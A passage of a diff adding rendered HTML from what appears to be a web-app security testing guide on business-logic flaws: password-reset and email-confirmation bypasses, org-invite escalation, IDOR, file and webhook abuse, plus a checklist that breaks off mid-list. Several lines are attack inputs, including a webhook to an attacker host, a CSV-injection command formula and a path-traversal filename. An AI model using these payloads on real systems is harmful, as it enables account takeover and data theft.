+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>- Register first → OAuth login with same email
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>(Same pattern as 2.4.4 — worth testing independently here)
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">tokenless_reset.sh</span><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># If reset is based only on user_id or email with no token:</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>POST<span class="w"> </span>/api/reset<span class="w"> </span><span class="o">{</span><span class="s2">&quot;user_id&quot;</span>:<span class="w"> </span><span class="m">1043</span>,<span class="w"> </span><span class="s2">&quot;new_password&quot;</span>:<span class="w"> </span><span class="s2">&quot;hacked123&quot;</span><span class="o">}</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="c1"># No token required → ATO for any known user_id</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">support_bypass.sh</span><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># &quot;I can&#39;t log in&quot; recovery flows:</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>POST<span class="w"> </span>/api/support/reset-account<span class="w"> </span><span class="o">{</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="w">  </span><span class="s2">&quot;email&quot;</span>:<span class="w"> </span><span class="s2">&quot;victim@target.com&quot;</span>,
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="w">  </span><span class="s2">&quot;reason&quot;</span>:<span class="w"> </span><span class="s2">&quot;locked out&quot;</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="o">}</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="c1"># Does support flow verify identity before resetting?</span>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="c1"># Does it send to email, or return new credentials directly?</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<hr />
+<h3 id="652-email-confirmation-bypass">6.5.2 Email Confirmation Bypass<a class="headerlink" href="#652-email-confirmation-bypass" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">email_confirm_bypass.sh</span><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># 1. Access features before confirming:</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="c1"># Register → skip email click → navigate to /dashboard, /api/profile</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="c1"># Does app enforce verification on all sensitive actions or just first login?</span>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="c1"># 2. Confirm a different email than the token was issued for:</span>
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="c1"># Token issued for: your@email.com</span>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="c1"># Modify in URL: /confirm?token=abc&amp;email=victim@gmail.com</span>
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="c1"># Does app confirm the modified email or the token&#39;s original email?</span>
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="c1"># 3. Token not bound to email:</span>
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="c1"># Request token for email A → change email to B → use token</span>
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="c1"># Does it confirm email B?</span>
+</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>
+</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a><span class="c1"># 4. Confirmation link reuse:</span>
+</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a><span class="c1"># Click link → confirmed → click same link again</span>
+</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a><span class="c1"># Does anything happen? Session fixation? Duplicate confirmation?</span>
+</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>
+</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a><span class="c1"># 5. Predictable confirmation token:</span>
+</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a><span class="c1"># If tokens are sequential: /confirm?id=12345</span>
+</span><span id="__span-18-20"><a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a><span class="c1"># Confirm someone else&#39;s email by guessing their token ID</span>
+</span></code></pre></div>
+<hr />
+<h3 id="653-organization-and-invitation-logic">6.5.3 Organization and Invitation Logic<a class="headerlink" href="#653-organization-and-invitation-logic" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">org_logic_tests.sh</span><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># 1. Invite yourself with admin role:</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>POST<span class="w"> </span>/api/orgs/target-org/invite<span class="w"> </span><span class="o">{</span><span class="s2">&quot;email&quot;</span>:<span class="w"> </span><span class="s2">&quot;attacker@evil.com&quot;</span>,<span class="w"> </span><span class="s2">&quot;role&quot;</span>:<span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="o">}</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="c1"># 2. Join without invite:</span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>POST<span class="w"> </span>/api/orgs/target-org/join
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="c1"># Is joining open? Or invite-token required?</span>
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="c1"># 3. Invite token reuse (multiple joiners):</span>
+</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="c1"># Use same invite link from two different accounts</span>
+</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a><span class="c1"># Does the link work for both?</span>
+</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>
+</span><span id="__span-19-12"><a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a><span class="c1"># 4. Role escalation via re-invite:</span>
+</span><span id="__span-19-13"><a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a><span class="c1"># You&#39;re a &quot;member&quot; → manipulate invite accept request:</span>
+</span><span id="__span-19-14"><a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>POST<span class="w"> </span>/api/orgs/accept-invite<span class="w"> </span><span class="o">{</span><span class="s2">&quot;token&quot;</span>:<span class="w"> </span><span class="s2">&quot;xyz&quot;</span>,<span class="w"> </span><span class="s2">&quot;role&quot;</span>:<span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="o">}</span>
+</span><span id="__span-19-15"><a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>
+</span><span id="__span-19-16"><a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a><span class="c1"># 5. Cross-org resource access:</span>
+</span><span id="__span-19-17"><a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a>GET<span class="w"> </span>/api/orgs/orgB/members<span class="w">      </span><span class="c1"># IDOR — you&#39;re in orgA</span>
+</span><span id="__span-19-18"><a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a>GET<span class="w"> </span>/api/orgs/orgB/projects
+</span><span id="__span-19-19"><a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a>
+</span><span id="__span-19-20"><a id="__codelineno-19-20" name="__codelineno-19-20" href="#__codelineno-19-20"></a><span class="c1"># 6. Leave org but retain access:</span>
+</span><span id="__span-19-21"><a id="__codelineno-19-21" name="__codelineno-19-21" href="#__codelineno-19-21"></a><span class="c1"># Join → gain access → leave org</span>
+</span><span id="__span-19-22"><a id="__codelineno-19-22" name="__codelineno-19-22" href="#__codelineno-19-22"></a><span class="c1"># Check if session/token invalidated after membership change</span>
+</span></code></pre></div>
+<hr />
+<h2 id="66-feature-abuse-with-security-impact">6.6 Feature Abuse with Security Impact<a class="headerlink" href="#66-feature-abuse-with-security-impact" title="Permanent link">&para;</a></h2>
+<h3 id="661-file-operation-logic">6.6.1 File Operation Logic<a class="headerlink" href="#661-file-operation-logic" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">file_logic_tests.sh</span><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># 1. Filename collision — overwrite other users&#39; files:</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="c1"># User A uploads: report.pdf</span>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="c1"># User B uploads: report.pdf</span>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="c1"># Does B&#39;s upload overwrite A&#39;s? Are files namespaced per user?</span>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="c1"># 2. Delete other users&#39; files via IDOR:</span>
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>DELETE<span class="w"> </span>/api/files/5523<span class="w">  </span><span class="c1"># belongs to another user?</span>
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>
+</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="c1"># 3. Path traversal via filename:</span>
+</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="c1"># Upload filename: ../../config/evil.php</span>
+</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a><span class="c1"># Does app sanitize filenames before writing to disk?</span>
+</span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>
+</span><span id="__span-20-13"><a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a><span class="c1"># 4. Zip symlink attack:</span>
+</span><span id="__span-20-14"><a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a><span class="c1"># Create zip containing symlink → /etc/passwd</span>
+</span><span id="__span-20-15"><a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a><span class="c1"># Server extracts → follows symlink → reads sensitive file</span>
+</span><span id="__span-20-16"><a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a>
+</span><span id="__span-20-17"><a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a><span class="c1"># 5. Publicly accessible uploads without auth:</span>
+</span><span id="__span-20-18"><a id="__codelineno-20-18" name="__codelineno-20-18" href="#__codelineno-20-18"></a>GET<span class="w"> </span>/uploads/user_1043_profile.jpg<span class="w">   </span><span class="c1"># predictable path → info disclosure</span>
+</span><span id="__span-20-19"><a id="__codelineno-20-19" name="__codelineno-20-19" href="#__codelineno-20-19"></a><span class="c1"># Are uploaded files behind authentication?</span>
+</span><span id="__span-20-20"><a id="__codelineno-20-20" name="__codelineno-20-20" href="#__codelineno-20-20"></a>
+</span><span id="__span-20-21"><a id="__codelineno-20-21" name="__codelineno-20-21" href="#__codelineno-20-21"></a><span class="c1"># 6. Storage quota bypass:</span>
+</span><span id="__span-20-22"><a id="__codelineno-20-22" name="__codelineno-20-22" href="#__codelineno-20-22"></a><span class="c1"># Negative file size in upload request?</span>
+</span><span id="__span-20-23"><a id="__codelineno-20-23" name="__codelineno-20-23" href="#__codelineno-20-23"></a><span class="c1"># Does it bypass quota check?</span>
+</span></code></pre></div>
+<hr />
+<h3 id="662-importexport-data-exposure">6.6.2 Import/Export Data Exposure<a class="headerlink" href="#662-importexport-data-exposure" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">import_export_tests.sh</span><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1"># 1. Export contains more fields than UI shows:</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="c1"># Request export of your own data → compare CSV/JSON fields to what UI displays</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="c1"># Exports often include: hashed passwords, internal IDs, admin notes,</span>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c1"># 2FA secrets, IP logs, linked accounts, audit trail</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="c1"># 2. Export another user&#39;s data via IDOR:</span>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>GET<span class="w"> </span>/api/export?user_id<span class="o">=</span><span class="m">1043</span><span class="p">&amp;</span><span class="nv">format</span><span class="o">=</span>csv
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="c1"># Export responses often contain more sensitive data than normal API responses</span>
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="c1"># 3. Import overwrites existing records via ID collision:</span>
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>POST<span class="w"> </span>/api/import<span class="w"> </span><span class="o">{</span><span class="s2">&quot;data&quot;</span>:<span class="w"> </span><span class="o">[{</span><span class="s2">&quot;id&quot;</span>:<span class="w"> </span><span class="m">1043</span>,<span class="w"> </span><span class="s2">&quot;email&quot;</span>:<span class="w"> </span><span class="s2">&quot;attacker@evil.com&quot;</span><span class="o">}]}</span>
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="c1"># Does import update records belonging to other users?</span>
+</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>
+</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="c1"># 4. CSV injection in import fields:</span>
+</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a><span class="c1"># Field value: =&quot;=cmd|&#39; /C calc&#39;!A0&quot;</span>
+</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a><span class="c1"># When admin opens exported CSV in Excel → code executes on admin&#39;s machine</span>
+</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a><span class="c1"># Impact: admin&#39;s machine, not server-side — but still reportable</span>
+</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a>
+</span><span id="__span-21-19"><a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a><span class="c1"># 5. Race condition during bulk export:</span>
+</span><span id="__span-21-20"><a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a><span class="c1"># Trigger export during bulk operation → may include other users&#39; records</span>
+</span></code></pre></div>
+<hr />
+<h3 id="663-notification-and-webhook-logic">6.6.3 Notification and Webhook Logic<a class="headerlink" href="#663-notification-and-webhook-logic" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">webhook_tests.sh</span><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1"># 1. Webhook receives other users&#39; data:</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>POST<span class="w"> </span>/api/settings/webhook<span class="w"> </span><span class="o">{</span><span class="s2">&quot;url&quot;</span>:<span class="w"> </span><span class="s2">&quot;https://attacker.com/hook&quot;</span><span class="o">}</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="c1"># Does webhook fire for YOUR events only, or also org/global events?</span>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="c1"># Inspect payload — does it include other users&#39; data?</span>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="c1"># 2. Subscribe to notifications for resources you don&#39;t own:</span>
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>POST<span class="w"> </span>/api/notify<span class="w"> </span><span class="o">{</span><span class="s2">&quot;resource_id&quot;</span>:<span class="w"> </span><span class="m">1043</span><span class="o">}</span><span class="w">   </span><span class="c1"># IDOR — not your resource</span>
+</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="c1"># When resource 1043 is updated → you get notified → data leakage</span>
+</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>
+</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="c1"># 3. Webhook payload leaks sensitive fields:</span>
+</span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a><span class="c1"># Set up webhook → trigger various actions</span>
+</span><span id="__span-22-12"><a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a><span class="c1"># Does payload include: tokens, passwords, PII, internal IDs?</span>
+</span><span id="__span-22-13"><a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a><span class="c1"># Many webhook implementations leak more than intended</span>
+</span><span id="__span-22-14"><a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a>
+</span><span id="__span-22-15"><a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a><span class="c1"># 4. Send notifications to other users:</span>
+</span><span id="__span-22-16"><a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a>POST<span class="w"> </span>/api/notify/send<span class="w"> </span><span class="o">{</span><span class="s2">&quot;user_id&quot;</span>:<span class="w"> </span><span class="m">1043</span>,<span class="w"> </span><span class="s2">&quot;message&quot;</span>:<span class="w"> </span><span class="s2">&quot;Custom message&quot;</span><span class="o">}</span>
+</span><span id="__span-22-17"><a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a><span class="c1"># Can you send arbitrary notifications to other users?</span>
+</span><span id="__span-22-18"><a id="__codelineno-22-18" name="__codelineno-22-18" href="#__codelineno-22-18"></a><span class="c1"># Harassment vector, or phishing via trusted notification channel</span>
+</span></code></pre></div>
+<hr />
+<h2 id="part-6-complete-checklist">Part 6 Complete Checklist<a class="headerlink" href="#part-6-complete-checklist" title="Permanent link">&para;</a></h2>
+<details class="note">
+<summary>Expand full checklist</summary>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>PRICE &amp; PAYMENT
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>□ Negative quantity in checkout request
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>□ Zero quantity — order processes for free?
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>□ Direct price field tampering (client-supplied price trusted?)
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>□ Integer overflow on quantity (2147483648)
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>□ Currency parameter manipulation
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>□ Same coupon applied twice (sequential and concurrent)
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>□ Multiple different coupons stacked
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>□ Coupon for wrong product category
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>□ Expired coupon accepted?
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>□ Coupon valid after order cancellation?
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>□ Free trial re-registration via email variation
+</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>□ Subscription status field tampered via PATCH
+</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>
+</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>WORKFLOW &amp; STATE
+</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>□ Every multi-step flow: skip step 2, skip to final step
+</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a>□ Checkout without payment step
+</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a>□ Account features accessible without email verification
+</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a>□ Status field in PUT/PATCH: try all valid status values
+</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a>□ Step indicators in requests: tamper step number
+</span><span id="__span-23-21"><a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a>□ KYC / verification gates: directly access restricted features
+</span><span id="__span-23-22"><a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a>
+</span><span id="__span-23-23"><a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a>RACE CONDITIONS
+</span><span id="__span-23-24"><a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a>□ One-time coupons/codes: concurrent application
+</span><span id="__span-23-25"><a id="__codelineno-23-25" name="__codelineno-23-25" href="#__codelineno-23-25"></a>□ Gift card/voucher: concurrent redemption
+</span><span id="__span-23-26"><a id="__codelineno-23-26" name="__codelineno-23-26" href="#__codelineno-23-26"></a>□ Payments/transfers: double-spend attempt
+</span><span id="__span-23-27"><a id="__codelineno-23-27" name="__codelineno-23-27" href="#__codelineno-23-27"></a>□ Rate-limited actions: concurrent bypass
+</span><span id="__span-23-28"><a id="__codelineno-23-28" name="__codelineno-23-28" href="#__codelineno-23-28"></a>□ HTTP/2 single-packet attack for all of the above
+</span><span id="__span-23-29"><a id="__codelineno-23-29" name="__codelineno-23-29" href="#__codelineno-23-29"></a>□ Last-byte sync (Turbo Intruder gate) for HTTP/1.1 targets
+</span><span id="__span-23-30"><a id="__codelineno-23-30" name="__codelineno-23-30" href="#__codelineno-23-30"></a>
+</span><span id="__span-23-31"><a id="__codelineno-23-31" name="__codelineno-23-31" href="#__codelineno-23-31"></a>ACCOUNT LOGIC
+</span><span id="__span-23-32"><a id="__codelineno-23-32" name="__codelineno-23-32" href="#__codelineno-23-32"></a>□ Email change without current password → trigger reset → ATO
+</span><span id="__span-23-33"><a id="__codelineno-23-33" name="__codelineno-23-33" href="#__codelineno-23-33"></a>□ Email change to victim&#39;s email (pending) → account merge
+</span><span id="__span-23-34"><a id="__codelineno-23-34" name="__codelineno-23-34" href="#__codelineno-23-34"></a>□ Password reset without token (user_id/email only)
+</span><span id="__span-23-35"><a id="__codelineno-23-35" name="__codelineno-23-35" href="#__codelineno-23-35"></a>□ Email confirmation token: bound to email? Reusable? Predictable?
+</span><span id="__span-23-36"><a id="__codelineno-23-36" name="__codelineno-23-36" href="#__codelineno-23-36"></a>□ Confirm different email than token was issued for
+</span><span id="__span-23-37"><a id="__codelineno-23-37" name="__codelineno-23-37" href="#__codelineno-23-37"></a>□ Support/recovery flows: bypass verification?
+</span><span id="__span-23-38"><a id="__codelineno-23-38" name="__codelineno-23-38" href="#__codelineno-23-38"></a>
+</span><span id="__span-23-39"><a id="__codelineno-23-39" name="__codelineno-23-39" href="#__codelineno-23-39"></a>ORGANIZATION LOGIC
+</span><span id="__span-23-40"><a id="__codelineno-23-40" name="__codelineno-23-40" href="#__codelineno-23-40"></a>□ Invite yourself with admin role
+</span><span id="__span-23-41"><a id="__codelineno-23-41" name="__codelineno-23-41" href="#__codelineno-23-41"></a>□ Join org without invite
+</span><span id="__span-23-42"><a id="__codelineno-23-42" name="__codelineno-23-42" href="#__codelineno-23-42"></a>□ Invite token reuse (multiple joiners)
+</span><span id="__span-23-43"><a id="__codelineno-23-43" name="__codelineno-23-43" href="#__codelineno-23-43"></a>□ Leave org → retain access?
+</span><span id="__span-23-44"><a id="__codelineno-23-44" name="__codelineno-23-44" href="#__codelineno-23-44"></a>□ Cross-org resource access via IDOR
+</span><span id="__span-23-45"><a id="__codelineno-23-45" name="__codelineno-23-45" href="#__codelineno-23-45"></a>
+</span><span id="__span-23-46"><a id="__codelineno-23-46" name="__codelineno-23-46" href="#__codelineno-23-46"></a>FILE OPERATIONS
+</span><span id="__span-23-47"><a id="__codelineno-23-47" name="__codelineno-23-47" href="#__codelineno-23-47"></a>□ Filename collision → overwrite other users&#39; files
+</span><span id="__span-23-48"><a id="__codelineno-23-48" name="__codelineno-23-48" href="#__codelineno-23-48"></a>□ Delete other users&#39; files via IDOR
+</span><span id="__span-23-49"><a id="__codelineno-23-49" name="__codelineno-23-49" href="#__codelineno-23-49"></a>□ Filename path traversal (../../ in filename)
+</span><span id="__span-23-50"><a id="__codelineno-23-50" name="__codelineno-23-50" href="#__codelineno-23-50"></a>□ Zip symlink attack
+</span><span id="__span-23-51"><a id="__codelineno-23-51" name="__codelineno-23-51" href="#__codelineno-23-51"></a>□ Uploaded files publicly accessible without auth?
+</span><span id="__span-23-52"><a id="__codelineno-23-52" name="__codelineno-23-52" href="#__codelineno-23-52"></a>□ Storage quota bypass via negative file size
+</span><span id="__span-23-53"><a id="__codelineno-23-53" name="__codelineno-23-53" href="#__codelineno-23-53"></a>
+</span><span id="__span-23-54"><a id="__codelineno-23-54" name="__codelineno-23-54" href="#__codelineno-23-54"></a>IMPORT/EXPORT
